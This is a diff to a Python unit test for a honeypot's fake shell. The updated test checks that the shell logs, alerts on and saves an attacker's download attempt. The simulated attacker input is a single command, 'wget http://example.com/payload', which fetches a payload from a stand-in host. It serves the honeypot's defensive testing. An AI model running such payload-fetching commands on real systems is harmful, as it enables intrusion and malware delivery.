@@ -36,15 +36,19 @@ class TestFakeShell(unittest.TestCase):
         all_sent = "".join(call.args[0] for call in self.send_mock.call_args_list)
         self.assertIn("/\r\n", all_sent)
 
+    @patch("services.fake_shell.save_payload")
     @patch("services.fake_shell.log_event")
     @patch("services.fake_shell.send_alert")
-    def test_wget_logs_download_attempt(self, mock_alert, mock_log):
+    def test_wget_logs_download_attempt(self, mock_alert, mock_log, mock_save):
+        mock_log.return_value = {"rowid": 1}
         self.recv_mock.side_effect = ["wget http://example.com/payload", None]
         run_shell(self.send_mock, self.recv_mock, self.ip, self.port, self.service, self.username)
-        
-        # Should log download_attempt
+
         mock_log.assert_any_call(self.ip, self.port, self.service, "download_attempt", unittest.mock.ANY)
         mock_alert.assert_called_with(self.service, self.ip, unittest.mock.ANY, alert_type="download_attempt")
+        mock_save.assert_called_once()
+        args = mock_save.call_args
+        self.assertIn(b"wget http://example.com/payload", args[0])
 
     @patch("services.fake_shell.log_event")
     def test_exit_ends_session(self, mock_log):
